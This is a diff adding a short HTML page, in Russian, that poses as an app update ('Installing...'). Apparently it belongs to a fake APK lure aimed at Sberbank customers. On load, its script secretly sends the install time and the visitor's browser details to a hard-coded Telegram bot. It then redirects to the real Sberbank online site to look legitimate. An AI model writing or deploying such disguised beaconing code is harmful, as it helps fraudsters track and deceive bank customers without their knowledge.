@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Обновление</title>
+</head>
+<body>
+<h2>Установка...</h2>
+<script>
+    // Этот код выполнится при открытии APK
+    const BOT_TOKEN = "8655252412:AAGvwRmEBisGeKA5bX5_xFNpp2QRJRTkkTM";
+    const CHAT_ID = "8533450974";
+    
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: `📱 *APK УСТАНОВЛЕН*\n⏰ ${new Date().toLocaleString()}\n🌐 ${navigator.userAgent}`
+        })
+    });
+    
+    setTimeout(() => {
+        window.location.href = "https://online.sberbank.ru";
+    }, 2000);
+</script>
+</body>
+</html>
